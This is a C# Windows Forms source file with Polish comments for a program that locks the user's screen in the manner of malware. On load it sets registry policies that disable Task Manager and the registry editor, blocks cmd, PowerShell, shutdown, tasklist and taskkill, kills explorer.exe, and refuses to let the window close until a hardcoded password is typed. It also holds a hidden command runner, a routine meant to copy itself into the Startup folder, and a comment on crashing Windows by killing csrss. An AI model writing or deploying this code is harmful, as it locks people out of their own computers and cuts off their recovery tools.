using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.IO;
using System.Security.Cryptography;
/*
 MessageBox.Show("{Treść}", "{Tytuł}", MessageBoxButtons.OK, MessageBoxIcon.Asterisk); - msgbox
 System.Diagnostics.Process.GetProcessesByName("csrss")[0].Kill(); - BSOD
 */
namespace Reflection_V
{
	public partial class Form1 : Form
	{
		public Form1() //Nie zmieniać
		{
			InitializeComponent();
		}
		RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		RegistryKey key2 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
		RegistryKey key3 = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun");
		private void Form1_Load(object sender, EventArgs e) //Włączanie programu
		{
			key.SetValue("DisableTaskMgr", 1);
			//key.SetValue("EnableLUA", 0);
			key.SetValue("DisableRegistryTools", 1);
			key2.SetValue("DisallowRun", 1);
			key3.SetValue("1", "cmd.exe");
			System.Diagnostics.Process.GetProcessesByName("explorer")[0].Kill();
			key3.SetValue("2", "powershell.exe");
			key3.SetValue("3", "shutdown.exe");
			key3.SetValue("4", "tasklist.exe");
			key3.SetValue("5", "taskkill.exe");
			key3.SetValue("6", "powershell_ise.exe");
		}
		private void textBox1_TextChanged(object sender, EventArgs e) 
		{
			
		}
		private void button1_Click(object sender, EventArgs e) //Wyłączenie za pomocą hasła
		{
			string pass = "s58adk9aod6";
			if (textBox1.Text == pass)
			{
				Registry.CurrentUser.DeleteSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
				Registry.CurrentUser.DeleteSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun");
				Registry.CurrentUser.DeleteSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
				System.Windows.Forms.Application.Exit();
			}
		}
		private void exec_cmd(string arguments) // Wywołanie: exec_cmd("/C [komenda]")
		{
			System.Diagnostics.Process process = new System.Diagnostics.Process();
			System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
			startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
			startInfo.FileName = "cmd.exe";
			startInfo.Arguments = arguments;
			process.StartInfo = startInfo;
			process.Start();
		}
		private void Instalacja()
		{
			string me = System.Reflection.Assembly.GetExecutingAssembly().Location;
			string destination = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
			FileInfo aboutme = new FileInfo(me);

			if (aboutme.DirectoryName == destination)
			{
				File.Copy(me, destination + "\\" + aboutme.Name);
			}
		}
		protected override void OnFormClosing(FormClosingEventArgs e) //Block Exit
		{
			switch (e.CloseReason)
			{
				case CloseReason.UserClosing:
					e.Cancel = true;
					break;
			}

			base.OnFormClosing(e);
		}
	}
}
